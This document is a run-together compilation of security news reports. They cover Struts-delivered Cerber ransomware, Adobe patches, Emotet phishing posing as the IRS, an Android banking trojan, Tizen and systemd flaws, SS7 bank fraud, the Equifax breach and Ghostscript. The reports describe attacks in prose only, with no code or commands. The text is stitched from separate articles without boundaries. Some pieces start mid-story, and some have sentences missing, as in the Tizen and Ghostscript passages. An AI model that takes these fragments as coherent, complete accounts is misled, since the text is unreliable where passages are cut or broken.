F5 experts say that in the beginning, attackers targeted Struts instances running on Linux servers, where they would end up installing the PowerBot malware, an IRC-controlled DDoS bot also known as PerlBot or Shellbot.
In later attacks, some groups switched to installing a cryptocurrency miner called ""minerd"" that mined for the Monero cryptocurrency.
In other attacks reported by the SANS Technology Institute, some attackers installed Perl backdoors.
Both SANS and F5 experts report that after March 20, one of these groups switched to targeting Struts instances installed on Windows systems.
Using a slightly modified exploit code, attackers executed various shell commands to run the BITSAdmin utility and then downloaded (via Windows' built-in FTP support) the Cerber ransomware.
From this point on, Cerber took over, encrypted files, and displayed its standard ransom note, leaving victims no choice but pay the ransom demand or recover data from backups.
""The attackers running this [Cerber] campaign are using the same Bitcoin ID for a number of campaigns,"" the F5 team said.
""This particular account has processed 84 bitcoins [~$100,000].""
F5 experts also noted that, on average, roughly 2.2 Bitcoin (~$2,600) go in and out of this particular wallet on a daily basis.
It is worth mentioning that F5 published their findings last week, on March 29.
Today, SANS detailed similar findings, meaning the campaign spreading Cerber ransomware via Struts on Windows is still going strong.
Some of the initial attacks on Struts-based applications have been tracked by cyber-security firm AlienVault.

Adobe has released updates fixing a long list of security vulnerabilities discovered in the Mac and Windows versions of Acrobat and Reader.
In total, the first October update brings 85 CVEs, including 47 rated as ‘critical’ with the remaining 39 classified as ‘important’.
It’s too early to get much detail on the flaws but those rated critical break down as 46 allowing code execution and one allowing privilege escalation. The majority of the flaws rated important involve out-of-bounds read issues leading to information disclosure.
As far as Adobe is aware, none are being actively exploited.

The update you should download depends on which version you have installed:
    For most Windows or Mac users it’ll be either Acrobat DC (the paid version) or Acrobat Reader DC (free) so look for update version 2019.008.20071.
    For anyone on the classic Acrobat 2017 or Acrobat Reader DC 2017, it’s version 2017.011.30105.
    Those on the even more classic Acrobat DC (2015) or Acrobat Reader DC (2015) it’s version 2015.006.30456.

Anyone who still has the old Acrobat XI or Reader XI on their computer, the last version was 11.0.23 when support for this ended a year ago.
A sign of success?
There was a time when having to patch so many flaws in a small suite of products from one company would have been seen as a failure.
Arguably, these days, it’s a sign of success – researchers are devoting the time to finding vulnerabilities before the bad guys do and Adobe is turning around fixes.
What’s surprising is that despite crediting every one of them (and it’s quite a list), the company doesn’t seem to have a formal bug bounty reward program other than the separate web applications program run via third party company, HackerOne.
If Adobe’s 85 vulnerabilities sounds excessive, have some sympathy for users of the rival Foxit PDF Reader and Foxit PhantomPDF programs. Foxit last week released what appears to be 116 vulnerabilities of their own (confusingly, many of which are not yet labelled with CVEs).
For some reason, the number of flaws being found in Foxit’s programs has surged this year, reaching 183 before this September’s count, compared to 76 for the whole of 2017.
As for Adobe, these updates are unlikely to be the last we hear of the company this month – expect the usual flaws to be patched in Adobe’s legacy Flash plug-in when Microsoft releases its Windows Patch Tuesday on 9 October.

The Internal Revenue Service today warned the public of a tax transcript scheme via a surge of fraudulent emails impersonating the IRS. The emails offer tax transcripts, or the summary of a tax return, as bait to entice users to open documents containing malware.
The scam email carries an attachment labeled “Tax Account Transcript” or something similar, and the subject line uses some variation of the phrase “tax transcript.” The IRS said the scam is especially problematic for businesses whose employees might open the malware because it can spread throughout the network and potentially take months to successfully remove.
Known as Emotet, the well-known malware generally poses as specific banks and financial institutions in its effort to trick people into opening infected documents. However, in the past few weeks, the scam has been masquerading as the IRS, pretending to be from “IRS Online.”
The United States Computer Emergency Readiness Team (US-CERT) issued a warning in July about earlier versions of the Emotet in Alert (TA18-201A) Emotet Malware. US-CERT has labeled the Emotet Malware “among the most costly and destructive malware affecting state, local, tribal, and territorial (SLTT) governments, and the private and public sectors.”
The IRS reminds taxpayers it does not send unsolicited emails to the public, nor would it email a sensitive document such as a tax transcript.
Taxpayers should not open the email or the attachment. If using a personal computer, delete or forward the scam email to phishing@irs.gov. If seen while using an employer’s computer, notify the company’s technology professionals.

Adobe has resolved six critical updates in the company's latest round of security fixes.
On Tuesday, Adobe said in a security advisory that the update impacts ColdFusion version 11, as well as the 2016 and 2018 releases of the web application development platform.
In total, six of the security flaws are deemed critical.
The first set of vulnerabilities -- CVE-2018-15965, CVE-2018-15957, CVE-2018-15958, and CVE-2018-15959 -- relate to the deserialization of untrusted data.
In addition, CVE-2018-15961 is a security flaw which permits unrestricted file uploads in the software, and the final critical bug, CVE-2018-15960, is described as ""use of a component with a known vulnerability"" which can cause arbitrary file overwrite.
If exploited, all of the above security flaws can lead to arbitrary code execution.
Three other bugs in ColdFusion have also been resolved. CVE-2018-15962 is a flaw within directory listings that can lead to information disclosure; CVE-2018-15963 is a security bypass bug which could permit attackers to create arbitrary folders, and CVE-2018-15964 is another security flaw caused by the use of a component with a known vulnerability which may cause data leaks.
Adobe also released a fix for Adobe Flash Player on desktop Windows, macOS, and Linux machines, as well as Flash for Google Chrome on Windows, macOS, Linux, and Chrome OS, versions 30.0.0.154 and earlier.
This security flaw, CVE-2018-15967 is listed as an ""important"" privilege escalation bug which could lead to information disclosure.
Originally, Microsoft listed the same vulnerability as critical and one which enabled attackers to perform remote code execution attacks.
However, Microsoft has now amended its advisory to reflect Adobe's severity rating.
Adobe is not aware of any reports suggesting the vulnerabilities have been exploited in the wild but recommends that users accept the automatic updates as soon as possible.
The tech giant thanked researchers including Matthias Kaiser of Code White GmbH, Gsrc from Venustech-Adlab, and Nick Bloor of Cognitous for reporting the vulnerabilities.
This month's security fixes build upon Adobe's August patch update, in which 11 security flaws were resolved, including critical vulnerabilities in Adobe Acrobat 2017, Acrobat DC, and Acrobat Reader DC on Windows and macOS machines.
In the same month, the tech giant also released an out-of-schedule patch for Adobe Photoshop CC. The security update tackled memory corruption bugs in the creative software which, if exploited, could lead to code execution.

By now, you may have heard that a hacking organization identifying itself as the Turkish Crime Family has gone hunting for a very big fish: It said that it has credentials for hundreds of millions of Apple accounts of various sorts (including email and iCloud), and it’s threatening to wipe all of the iPhones in the cache unless a hefty ransom is paid.
The group is asking for either $75,000 in Bitcoin or $100,000 in iTunes gift cards before the April 7 deadline.
Turkish Crime Family (let’s call them TCF) was first reported by Vice’s Motherboard as having 559 million total accounts—and other reports say there are either 200 million or 300 million vulnerable iPhone accounts.
Regardless of the number, it’s a lot—and on the surface the news, if TCF really does have those credentials, would indicate that Apple has suffered a major data breach.
Apple said in a media statement: “There have not been any breaches in any of Apple’s systems including iCloud and Apple ID.
The alleged list of email addresses and passwords appears to have been obtained from previously compromised third-party services.
We're actively monitoring to prevent unauthorized access to user accounts and are working with law enforcement to identify the criminals involved.
To protect against these type of attacks, we always recommend that users always use strong passwords, not use those same passwords across sites and turn on two-factor authentication.""
Which means that the danger, if it does exist, isn’t new for these Apple users.
And indeed, many of the accounts could be defunct: Some of the addresses are @mac.com and @me.com addresses, which could be almost two decades old.
Motherboard confirmed a back-and-forth conversation between the hackers and Apple security teams, but TCF has yet to publicly provide solid proof of how and what information they have, besides a YouTube video (now removed) that Motherboard said shows someone logging into an iCloud account.
Meanwhile, ZDNet said that it was able to get a data sample of 54 allegedly breached accounts from TCF—finding that they were all legitimate email addresses.
The outlet also reached 10 users that said the listed pilfered passwords were correct.
John Bambenek, threat systems manager of Fidelis Cybersecurity, said that he’s skeptical about the hacker group’s claims, noting that there are always people who make unfounded threats to organizations in the hope of an easy payday—or notoriety.
“The hacker group is not following what’s become typical operating procedure,” he said via email.
“For example, if this were a real ransomware attack, they would be communicating privately with the company they are targeting.
Based on previous incidents, the current threat has all the hallmarks of a stunt.
If they really have the ability to wipe iPhones then they would have wiped a few already as ‘proof of life’”.
But that said, do consumers really want to roll the dice with their pictures and other information on the phone?
Lamar Bailey, director of security research and development for Tripwire, said via email that the hackers may have indeed been able to meticulously assemble a cohesive database of previously stolen Apple credentials by making use of various former data breaches of sources outside of Apple—this is a good highlight once again of the widespread problem of password re-use.
It would have required a large effort, but he noted that it could be done.
“If this is legit, the hackers would have had to obtain access to the individual user accounts via breaking the passwords of each of the user accounts or have acquired access to the Apple iCloud servers,” he said.
“The access to each user account is much more realistic since we have seen numerous reports of all the weak passwords people use for their computers and accounts”.
And, he added, if the hackers have password access to individual user accounts, they can indeed erase phones remotely and change passwords for the Apple account.
“The hackers cannot remove backups for Apple devices from the cloud, but changing the passwords will make it hard for the legitimate users to reset and recover their devices,” he noted.
“Once the end-user has access to their account, they will be able to restore their device”.
Apple users—and indeed all users of any online-facing service—should make sure they’re using strong passwords and enabling two-factor authentication as an added protection.
“Having a local backup of your device is always a good idea too.
It is faster to restore a device locally than over the internet, and having a small NAS (Network Attached Storage) device at home for pictures and backups is a good investment to supplement the cloud backups,” Bailey added.

Android users were the target of new banking malware with screen locking capabilities, which was disguised as a weather forecast app on Google Play.
Detected by ESET as Trojan.Android/Spy.Banker.HU, the malware was a trojanized version of the otherwise benign weather forecast application Good Weather.
The malicious app managed to get around Google’s security mechanisms and appeared in the store on February 4th, only to be reported by ESET two days later and consequently pulled from the store.
During its short lifetime, the app found its way to devices of up to 5000 users.
Besides the weather forecast functionalities it adopted from the original legitimate application, the trojan is able to lock and unlock infected devices remotely and intercept text messages.
Apart from doing so, the trojan targeted the users of 22 Turkish mobile banking apps, whose credentials were harvested using phony login forms.
The infected device then displays a fake system screen requesting device administrator rights on behalf of fictitious “System update”.
By enabling these rights, the victim allows the malware to Change the screen-unlock password and Lock the screen.
Users who are not alarmed at this point might be pleased with the new weather widget they can add to their home screens.
However, in the background, the malware is getting to work sharing device information with its C&C server.
Depending on the command it gets in return, it can intercept received text messages and send them to the server, remotely lock and unlock the device by setting a lock screen password of the attackers’ choice, and harvest banking credentials.
The trojan displays a fake login screen once the user runs one of the targeted banking apps and sends entered data to the attacker.
Thanks to the permission to intercept the victims’ text messages, the malware is also able to bypass SMS-based two-factor authentication.
As for the device locking, we suspect this function enters the picture when cashing out the compromised bank account, to keep the fraudulent activity hidden from the user.
Once locked out, all victims can do is wait until the malware receives a command to unlock the device.
If you’ve recently installed a weather app from the Play Store, you might want to check if you haven’t been one of the victims of this banking trojan.
In case you think you might have downloaded an app named Good Weather, check for its icon under your apps.
After running anything you’ve installed on your mobile device, keep paying attention to what permissions and rights it requests.
An app that won’t run without advanced permissions that aren’t connected to its intended function might be an app you don’t want installed on your phone.

There was a caveat to the hack, however—the hijack involved older models of Samsung TVs and required the CIA have physical access to a TV to install the malware via a USB stick.
But the window to this sort of hijacking is far wider than originally thought because a researcher in Israel has uncovered 40 unknown vulnerabilities, or zero-days, that would allow someone to remotely hack millions of newer Samsung smart TVs, smart watches, and mobile phones already on the market, as well as ones slated for future release, without needing physical access to them.
The security holes are in an open-source operating system called Tizen that Samsung has been rolling out in its devices over the last few years.
It already has Tizen running on some 30 million smart TVs, as well as Samsung Gear smartwatches and in some Samsung phones in a limited number of countries like Russia, India and Bangladesh—the company plans to have 10 million Tizen phones in the market this year.
Samsung also announced earlier this year that Tizen would be the operating system on its new line of smart washing machines and refrigerators too.
But the operating system is riddled with serious security vulnerabilities that make it easy for a hacker to take control of Tizen-powered devices, according to Israeli researcher Amihai Neiderman.
A Samsung Z1 with the Tizen operating system on display at the Mobile World Congress 2015 in Barcelona, Spain.
But one security hole Neiderman uncovered was particularly critical.
It involves Samsung's TizenStore app—Samsung's version of Google Play Store—which delivers apps and software updates to Tizen devices.
Neiderman says a flaw in its design allowed him to hijack the software to deliver malicious code to his Samsung TV.
Because the TizenStore software operates with the highest privileges you can get on a device, it's the Holy Grail for a hacker who can abuse it.
""You can update a Tizen system with any malicious code you want,"" he says.
Although TizenStore does use authentication to make sure only authorized Samsung software gets installed on a device, Neiderman found a heap-overflow vulnerability that gave him control before that authentication function kicked in.
Although researchers have uncovered problems with other Samsung devices in the past, Tizen has escaped extensive scrutiny from the security community, probably because it's not widely used on phones yet.
It didn't take long for Neiderman to notice how bad the Tizen code was on his TV, which caused him to purchase a few Tizen phones to see what he could do with them as well.
He says much of the Tizen code base is old and borrows from previous Samsung coding projects, including Bada, a previous mobile phone operating system that Samsung discontinued.
""You can see that they took all this code and tried to push it into Tizen,"" Neiderman says.
But most of the vulnerabilities he found were actually in new code written specifically for Tizen within the last two years.
Many of them are the kind of mistakes programmers were making twenty years ago, indicating that Samsung lacks basic code development and review practices to prevent and catch such flaws.
But there's a basic flaw in it whereby it fails to check if there is enough space to write the data, which can create a buffer overrun condition that attackers can exploit.
A buffer overrun occurs when the space to which data is being written is too small for the data, causing the data to write to adjacent areas of memory.
A Tizen stand at the at the Mobile World Congress 2015 in Barcelona, Spain.
They use it on some data transmissions but not others, and usually not on ones that need it most.
""They made a lot of wrong assumptions about where they needed encryption,"" he says, noting that ""it's extra work to move between secure connections and unsecure connections.""
This indicates that they didn't do it inadvertently but were making conscious decisions not to use SSL in those places, he says.
Neiderman contacted Samsung months ago to report the problems he found but got only an automated email in response.

“In the online world, your security habits, such as keeping your software updated, play a big role in your level of your protection on the Internet,” said Ondrej Vlcek, Chief Technology Officer, GM and EVP Consumer Business at Avast.
“Running outdated programmes leaves PC users susceptible to attacks from savvy hackers exploiting easy-to-find or known vulnerabilities.
The cause of people using outdated software may be that updates don’t install properly or they postpone or forget to update even when prompted.

This member of Google’s Project Zero security team is already well known for his abilities to locate and report serious vulnerabilities in many widely used services, and even in the password manager that was supposed to be safe.
The comment from LastPass states that the flaw is “unique and highly sophisticated”.
So far, they have not shared any details that could be exploited before fixing is complete, but this is the second weekend in a row that LastPass security team is on a bug fixing duty.
They thanked Tavis and others like him for reporting these sort of problems and helping them make online security even better for the rest of their users.
Not everyone was happy about Ormandy’s newest twitter news.
Some even called him on sharing the news about the latest bug problem, believing that his actions only cause fear and uncertainty.
What they fail to realize is that all services have to face vulnerabilities from time to time, and all of them get patched up as soon as they are discovered.
Most if not all online services have had their fair share of security issues, and most of them managed to get discovered and fixed by people like Ormandy.

Social media scams such as blackmail, identity theft, money laundering and dating scams are expected to gain popularity in SA this year.
This is according to Kovelin Naidoo, chief cyber security officer at FNB, who explains that although social media scams in SA are not yet as prevalent as global counterparts; the reality is that they do exist.
As social media continues to gain prominence among South African consumers, Naidoo believes platforms like Instagram, Youtube, Facebook and Twitter have also become a platform where fraudsters attempt to catch unsuspecting consumers off guard.
""Given that the popularity of social media is set to remain for the coming years, consumers are encouraged to constantly educate themselves and their loved ones about the latest methods that fraudsters use to get hold of their victims' personal information,"" adds Naidoo.
Naidoo warns consumers to look out for money laundering scams - when scammers trick people through social media platforms by claiming to have large sums of cash that they need to deposit urgently through a foreign bank account and identity theft - when fraudsters steal information and use it illegally by impersonating victims.
""Social media blackmail is another scam to watch out for - never share personal photos or videos on social media that portray you in a compromising position as scammers can use these against you by threatening to send them to close family members or upload them on public platforms. Another scam to gain traction is a social media phishing scam, where fraudsters pretend to represent the victim's bank on social media platforms,"" advises Naidoo.
Manuel Corregedor, COO of Telspace Systems, says consumers who use social media platforms to meet companions or their life partners should also look out for dating or romance scams.
""In these scams, criminals play on the emotions of victims in order to scam them out of money i.e. they target certain profiles based on age, gender and marital status. Once connected, the criminal starts to 'build a relationship', with the victim as a means to get them to like or love them. Once this happens, the criminal plays on the victim's emotions as a means to get money from the client.""
It is necessary to create an awareness around such scams and educate people, advises Corregedor. However, it should be noted, that these scams are not new - they existed before social media. Additional things users can do to protect themselves online is to only add people on social media sites, in particular Facebook, that they have met in person before; restrict who can see your photos, posts, and look out for the following signs that it might be a scam.
Denis Makrushin, security researcher at Kaspersky Lab, says that social media chain letters and phishing is also expected to gain traction this year.
""Some social media messages ask recipients to send a small sum of money to certain addressees. Cyber criminals use chain letters to distribute malware - a letter may contain a link to a malicious Web site. A recipient is lured into visiting the site on some pretext or other, for example they are warned about a virus epidemic and are offered the possibility to download an 'antivirus program'.
""Furthermore phishing scams via social media messages are also markedly more detailed and sophisticated than the average phishing e-mail. For example, one might be a security alert saying that someone just tried to sign into your account from such and such address using such and such browser - all you have to do is click the link to check that everything's OK,"" he explains.
Naidoo advises social media users to never share their banking details with strangers and to think twice before sending money to someone you recently met online or haven't met in person yet.

When you’re as ginormous a target as the global telecommunications industry, and you’re sitting on a flaw as big as the one affecting its SS7 protocol, best not rely on “security through obscurity”. You and your customers could get badly bitten – and so they have.
The Signalling System No. 7 (SS7) telephony signaling protocol used to establish interoperability across some 800+ service providers worldwide, is deeply vulnerable to interception by hackers, criminals, and corrupt insiders. We’ve known this for years. Now, in Germany, someone’s used that vulnerability to raid consumers’ online bank accounts.
SS7 was designed back in the 1970s, when access to phone networks was viewed as rare and controllable: back then, for example, AT&T still had an essentially complete monopoly over all US phone service. But now, a world of internet, VoIP, and wireless providers can link into SS7 to do all manner of fascinating things, and mess-with-SS7 skills and tools aren’t nearly so scarce. The telecom industry, however, has been appallingly slow to react. Maybe they will now.
As first reported by the German daily newspaper Süddeutsche Zeitung, this two-part attack zeroed in on SS7 call-forwarding features that allow networks to validate your SIM card when you travel internationally.
First, according to Bank Info Security, hackers sent conventional fake phishing emails to victims, suckering them into visiting fake bank websites, where they were told to enter account numbers, passwords and the mobile phone numbers they had previously given their banks.
Meanwhile, per The Register, the attackers “purchased access to a rogue telecommunications provider and set up a redirect for the victim’s mobile phone number to a handset controlled by the attackers”. Now, they could wait until late at night, log into the victims’ online accounts, and start money transfers. As part of their SMS-based two-factor authentication (2FA) systems, the banks would dutifully send one-time mobile transaction authentication number (mTAN) numbers to their customers. These would be hijacked by the criminals, who now had the second authentication factor they needed to complete the thefts.
The short-term solution is for telecommunications service providers to turn off SS7’s call forwarding features except for trusted providers. O2-Telefonica told Süddeutsche Zeitung that it blocked the specific foreign carriers who were the source of these attacks in January – but that doesn’t prevent similar attacks arising from other sources against other carriers.

The Indiana Department of Revenue and the Internal Revenue Service is warning individuals and businesses about emails that use tax transcripts as bait to entice users to open attachments.
These scams are problematic for businesses or government agencies whose employees open the malware infected attachments, putting the entire network at risk.
This well-known malware, known as Emotet, generally poses as specific banks or financial institutions to trick individuals into opening infected documents.
It’s been described as one of the most costly and destructive malware to date.
Both the DOR and IRS have several tips to help individuals and businesses stay clear of these scams:
- The DOR and IRS do not contact customers via email to share sensitive documents such as a tax transcript
- Use security software to protect against malware and viruses, and make sure it’s up-to-date
- Never open emails, attachments, or click on links when you’re not sure of the source
If you receive an email claiming to be the IRS, delete it or forward the email to phishing@irs.gov <mailto:phishing@irs.gov>.
If the email claims to be from the DOR forward it to investigations@dor.in.gov <mailto:investigations@dor.in.gov>.
Emotet is known to constantly evolve, and in the past few weeks has masqueraded as the IRS, pretending to be “IRS Online”. The scam email includes an attachment, with the subject line often including “tax transcript”.

Researchers have discovered some serious security flaws threatening Linux. These vulnerabilities exist in Linux systemd component. According to the researchers, the vulnerabilities pose a risk to all systemd-based Linux distros.
Allegedly, researchers at Qualys have disclosed some bugs targeting the Linux systemd component. Systemd provides the core building blocks for Linux and handles major processes after booting.
As revealed, three vulnerabilities have targeted the systemd-journald, which is responsible for data collection and log storage. The vulnerabilities let an attacker gain root privileges on the target device. The researchers state that these vulnerabilities threaten all Linux distros based on systemd except a few. As stated in their report,
    “To the best of our knowledge, all systemd-based Linux distributions are vulnerable, but SUSE Linux Enterprise 15, openSUSE Leap 15.0, and Fedora 28 and 29 are not exploitable because their user space is compiled with GCC’s -fstack-clash-protection.”
The three bugs include two different memory corruption flaws (CVE-2018-16864 and CVE-2018-16865), and an out-of-bounds flaw (CVE-2018-16866). At first, the researchers accidentally discovered CVE-2018-16864 while working on an exploit for a previously disclosed vulnerability, Mutagen Astronomy. Then, when they were busy on its PoC, they spotted the other two bugs.
    “We developed a proof of concept for CVE-2018-16864 that gains eip control on i386… We developed an exploit for CVE-2018-16865 and CVE-2018-16866 that obtains a local root shell in 10 minutes on i386 and 70 minutes on amd64, on average.”
Interestingly, the bugs had been around for quite a few years.
For now, Red Hat has patched the bugs CVE-2018-16864 and CVE-2018-16865. Whereas, Debian has fixed CVE-2018-16866 in the unstable systemd 240-1 release. Other distros will also supposedly release the fixes soon.
In November 2018, a Google researcher also highlighted a critical flaw in Systemd that induced system crashes and hacks.

Ransomware will continue to dominate the cyber security landscape, with a new report from security specialists ESET forecasting the ‘year of ransomware’ will continue into 2017.
ESET’s Trends 2017: Security held ransom presents key cyber security topics of relevance for both businesses and consumers about the latest threats taking shape in the new year and identifies ransomware as a key threat to protect against.
The report suggests ransomware will continue en masse.
“We anticipate a new trend on the horizon: The Ransomware of Things or RoT, i.e.
the possibility of cybercriminals “hijacking” devices such as home security cameras and then demanding a ransom payment in exchange for restoring control to the user,” ESET says in the report.
Nick FitzGerald, senior research fellow at ESET agrees that ransomware attacks will continue to increase in ANZ throughout 2017.
“Ransomware was a serious security problem throughout 2016.
ESET takes no joy from having been on the right side of that prediction, nor in predicting that ongoing ransomware developments and ensuing success for the cybercriminals behind it seems likely to continue apace into 2017,” FitzGerald says.
“As wealthy markets, Australia and New Zealand are often targeted in ransomware campaigns, and online users should continue to be especially wary of unsolicited email with attachments or URLs, and ‘too good to be true’ offers,” he says.
According to FitzGerald, with the cost of cybercrime rising more than 200% over the past five years alone, ESET assembled the report to not only help businesses and individuals understand the advanced tactics and techniques employed by criminal hackers, but to safeguard against threats in the coming year.
“Considering the adverse reputational as well as financial impacts which result from cybercrime, it is critical that all users are aware of the types of attacks that can affect them,” he says.
“The report also highlights the importance of continual education as one of the essential components for staying safe online and offers its readers simple steps for raising one’s level of awareness”.

Global software industry advocate BSA | The Software Alliance is warning Australian organisations to be mindful of the security risks involved with using unlicensed software after it settled with a record number of infringement settlements last year.
A total of 28 case settlements for the use of unlicensed software occurred in 2017 – twice the amount in 2016. The 28 settlements were worth more than $347,000 in damages against businesses across Australia.
BSA warns that with the Notifiable Data Breaches legislation now in effect, this is a good time for organisations to consider the risks unlicensed software bring to their business.
“Businesses need to remember that unlicensed software, or software downloaded from an unknown source, may contain malware which puts an organisation and its customers at significant risk of becoming the victim of a data breach,” comments BSA APAC’s director of compliance programs, Gary Gan.
“Without properly licensed software, organisations don’t receive patch updates which strengthen the software’s security and address vulnerabilities, which otherwise would leave the business exposed.”
One of the 28 settlements involved a Western Australia-based energy company that was found using unlicensed software. The settlement amounted to more than $40,000.
Every business caught using unlicensed software had to purchase genuine software licenses for ongoing use on top of the copyright infringement damages. 
“It’s especially important that organisations are ensuring they’re doing all they can to protect their data given the recent introduction of NDB legislation. In order to stay on top of their software licensing, businesses should consider investing in SAM tools. The potential consequences faced by businesses that are found to be using unlicensed software far outweighs the cost of investment into SAM, something that all businesses should be considering,” Gan continues.
The BSA continues to clamp down on unlawful use of its members’ software. Members include Adobe, Apple, IBM, Microsoft, Okta, Oracle, Symantec, Trend Micro and Workday, amongst others.
BSA offers up to $20,000 to eligible recipients who disclose accurate information regarding unlawful copying or use of BSA members’ software. Potential recipients must provide assistance and evidence to support the information, as may be required by the BSA’s legal advisers, in connection with any claim or legal proceedings initiated by the BSA members.
BSA says it remains committed to its role in raising awareness of the risks to businesses when using unlicensed software and the damaging effects that software piracy has on the Australian IT industry.

The saga of CVE-2017-0199, a recently patched zero-day vulnerability affecting Microsoft Office and WordPad, just got a little stranger yesterday after cyber-security firm FireEye revealed the vulnerability was used by both cyber-criminals pushing mundane malware, and also by state-sponsored cyber-espionage groups.
This twisted tale starts in July 2016, when security researcher Ryan Hanson discovered a flaw in RTF files that he could exploit to execute code on the underlying operating system.
After finishing his research, Hanson submitted a write-up on the three bugs he found to Microsoft in October 2016, via the company's bug bounty program.
Uncharacteristic to Microsoft, the company took almost six months to fix the three bugs discovered by Hanson, delivering patches for all three (CVE-2017-0106, CVE-2017-0199, and CVE-2017-0204) in April's Patch Tuesday.
A few days before Microsoft patched the zero-day, news about it broke via blog posts from McAfee and FireEye, both companies revealing the zero-day was under active exploitation.
Unfortunately, this long patching period gave others the time to discover the same flaw. While initially McAfee and FireEye restrained from revealing any details about the zero-day, now that a patch is available, several security firms are now sharing more behind-the-scenes details.
According to FireEye, the zero-day first came on their radar on January 25, 2017, when they discovered a FinSpy module exploiting the flaw.
While FireEye discovered only this campaign, the cyber-security firm believes Gamma Group made available this new Microsoft zero-day to all of its clients, meaning it was likely used in other countries where the company sold its ""lawful intercept"" spyware.
Two months after this campaign, towards the end of March, FireEye says it detected the zero-day again, but this time used by a group of cyber-criminals spreading LatentBot, a sophisticated backdoor trojan, usually found in enterprise environments and used for economic espionage campaigns.
This group apparently started a yard sale after McAfee and FireEye disclosed the zero-day in public. Fearing that a patch was coming, this group shared (most likely sold) the zero-day exploit with other crimeware groups.
While initially this zero-day was classified as an Office vulnerability, Microsoft's security advisory revealed this vulnerability also affected WordPad, a free document viewer included by default with all Windows versions.
This means that if users didn't have Office installed, they were at risk if they chose to open the booby-trapped files with WordPad. In this case, the exploit packed within the file would execute, download an HTA (HTML application) file disguised as an RTF, which in turn would run PowerShell commands that exploited the user's computer.

SAN FRANCISCO — Hackers took advantage of an Equifax security vulnerability two months after an industry group discovered the coding flaw and shared a fix for it, raising questions about why Equifax didn't update its software successfully when the danger became known. 
A week after Equifax revealed one of the largest breaches of consumers' private financial data in history — 143 million consumers and access to the credit-card data of 209,000 — the industry group that manages the open source software in which the hack occurred blamed Equifax. 
""The Equifax data compromise was due to (Equifax's) failure to install the security updates provided in a timely manner,"" The Apache Foundation, which oversees the widely-used open source software, said in a statement Thursday.
Equifax told USA TODAY late Wednesday the criminals who gained access to its customer data exploited a website application vulnerability known as Apache Struts CVE-2017-5638. 
The vulnerability was patched on March 7, the same day it was announced, The Apache Foundation said. Cybersecurity professionals who lend their free services to the project of open-source software — code that's shared by major corporations and that's tested and modified by developers working at hundreds of firms — had shared their discovery with the industry group, making the risk and fix known to any company using the software. Modifications were made on March 10, according to the National Vulnerability Database.
But two months later, hackers took advantage of the vulnerability to enter the credit reporting agency's systems: Equifax said the unauthorized access began in mid-May.
Equifax did not respond to a question Wednesday about whether the patches were applied, and if not, why not. ""We continue to work with law enforcement as part of our criminal investigation and have shared indicators of compromise with law enforcement,"" it said.
It should have have acted faster to successfully deal with the problem, other cybersecurity professionals said.
""They should have patched it as soon as possible, not to exceed a week. A typical bank would have patched this critical vulnerability within a few days,” said Pravin Kothari, CEO of CipherCloud, a cloud security company.
Federal regulators are now investigating whether Equifax is at fault. The Federal Trade Commission and the Consumer Financial Protection Bureau have said they've opened probes into the hack.
So far dozens of state attorneys general are investigating the breach, and on Tuesday Massachusetts Attorney General Maura Healey said she plans to sue the company for violating state consumer protection laws. More than 23 class-action lawsuits against the company have also been proposed.
Proof that Equifax failed to protect customers, particularly when it had the tools and information to do so, is likely to further damage Equifax's financial outlook. Shares fell 2.5% Thursday after news of the FTC probe and are down 33% since it revealed the link.

Tavis Ormandy, a Google Project Zero security researcher, has revealed details about a new major vulnerability discovered in Ghostscript, an interpreter for Adobe's PostScript and PDF page description languages.
Ghostscript is by far the most widely used solution of its kind. The Ghostscript interpreter is embedded in hundreds of software suites and coding libraries that allow desktop software and web servers to handle PostScript and PDF-based documents.

Exploiting the bug Ormandy discovered requires that an attacker sends a malformed PostScript, PDF, EPS, or XPS file to a victim. Once the file reaches the Ghostscript interpreter, the malicious code contained within will execute an attacker's desired on that machine.
The vulnerability, which has not received a CVE identifier just yet, allows an attacker to take over applications and servers that use vulnerable versions of Ghostscript.
At the time of writing, there is no fix available.
By far, the most affected projects are the ImageMagick image processing library, but also many Linux distros where this library ships by default. RedHat and Ubuntu have already confirmed they are affected, according to a CERT/CC security advisory released today.
""I *strongly* suggest that [Linux] distributions start disabling PS, EPS, PDF and XPS coders in [ImageMagick's] policy.xml by default,"" Ormandy said.

Because of Ghostscript's broad adoption in the web dev and software dev communities, Ormandy has had his eyes set on Ghostscript for the past few years.
He discovered similar high severity issues affecting Ghostscript in 2016 and again in 2017.
The vulnerability he found in 2017 —CVE-2017-8291— was adopted by North Korean hackers, who used it to break into South Korean cryptocurrency exchanges, steal funds, and later plant false flags in an attempt to pin the hacks on Chinese-speaking threat actors.
Because of Ghostscript's wide adoption, any bugs, and especially those that lead to remote code execution, are highly sought-after by any threat actor.

A popular horse racing website (Racingpulse.in) that operates out of Bangalore, India was reportedly hacked on Tuesday. The hackers posted a statement on the home page informing that the entire data on the website has been encrypted.
As is the norm, they also informed about what they expected as ransom.
The ransom note suggested that they were expecting ransom amount in Bitcoins while the amount to be paid was not disclosed clearly.
The message also included an email address for further communication, which was registered at india.com.
The hackers offered Racingpulse.in an unimaginable favor by providing decryption key of a maximum of three files which should not be more than 10mb in size for free.
This was probably done to prove that they did hack all the files on the site.
The note read:
“All your files have been encrypted: All your files have been encrypted due to a security problem with your PC.
If you want to restore them, write us to the e-mail mkgoro@india.com, You have to pay for decryption in Bitcoins.
After payment, we will send you the decryption tool that will decrypt all your files.
“Free decryption as a guarantee: Before paying you can send to us up to 3 files for free decryption.
The message contained a link to the beginners’ guide to Bitcoins too.
“How to obtain Bitcoins: The easiest way to buy bitcoins is LocalBitcoins site.
You have to register, click ‘Buy bitcoins’, and select the seller by payment method and price.
The ransomware used in this attack is a new version of Dharma Ransomware Trojan.
In the ransom note, hackers have provided the email address mkgoro@india.com, which is a contact email for the victims to facilitate communication with them.
According to security researchers, this new version of Dharma works just like the older version using unsolicited emails.
These emails contain social network logos, bank information, payment portals and an option to download and open a file.
The previous two attacks were countered by using backup files, said Kumar.
“We have now decided to move to another server in the hope of better security, it may take a day for the site to be up and running,” revealed Kumar.

As part of Microsoft's monthly Patch Tuesday updates, a critical flaw in Windows has been patched that is actively being exploited. A vulnerability in the VBScript engine allowed for a zero-day exploit to infect machines by opening specially crafted scripts that can corrupt memory leading to the opportunity for arbitrary code execution.
In a web-based attack, specially designed web pages could exploit the same vulnerability when using Internet Explorer. Embedding AcitveX controls that were marked ""safe for initialization"" inside of a Microsoft Office document also allowed for unsafe code to be executed since the IE rendering engine is used.
